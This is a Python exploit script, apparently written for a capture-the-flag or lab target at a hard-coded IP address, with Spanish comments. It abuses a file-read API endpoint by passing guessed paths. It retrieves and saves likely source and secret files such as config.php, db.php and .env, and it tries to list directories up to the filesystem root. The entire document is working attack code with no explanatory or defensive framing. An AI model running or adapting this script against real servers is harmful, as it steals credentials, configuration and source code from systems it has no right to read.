#!/usr/bin/env python3
import requests

base_url = "http://94.237.57.115:46418"

print("=== Buscando archivos fuente ===\n")

# Posibles archivos a buscar
files = [
    "index.php",
    "report.php", 
    "upload.php",
    "config.php",
    "db.php",
    "functions.php",
    "api.php",
    "verify.php",
    "challenge/index.php",
    "challenge/report.php",
    "challenge/upload.php",
    "src/index.php",
    "src/report.php",
    "app/index.php",
    "app/report.php",
    "public/index.php",
    "index.py",
    "app.py",
    "main.py",
    "server.py",
    "package.json",
    "composer.json",
    ".env",
    "requirements.txt"
]

for file_path in files:
    r = requests.get(f"{base_url}/api/file", params={"path": file_path})
    if r.status_code == 200 and "error" not in r.text:
        print(f"✓ Encontrado: {file_path}")
        print(f"Contenido (primeras líneas):")
        print("-" * 50)
        lines = r.text.split('\n')[:30]
        for line in lines:
            print(line)
        print("-" * 50)
        print()
        
        # Guardar el archivo
        with open(f"source_{file_path.replace('/', '_')}", "w") as f:
            f.write(r.text)
    elif "Invalid file path" not in r.text and "File not found" not in r.text:
        print(f"? {file_path}: {r.text[:100]}")

# Intentar listar directorios
print("\n=== Intentando listar directorios ===")
dirs = [".", "/", "challenge", "src", "app", "public", "api"]
for dir_path in dirs:
    r = requests.get(f"{base_url}/api/file", params={"path": dir_path})
    if r.status_code == 200:
        print(f"Dir {dir_path}: {r.text[:200]}")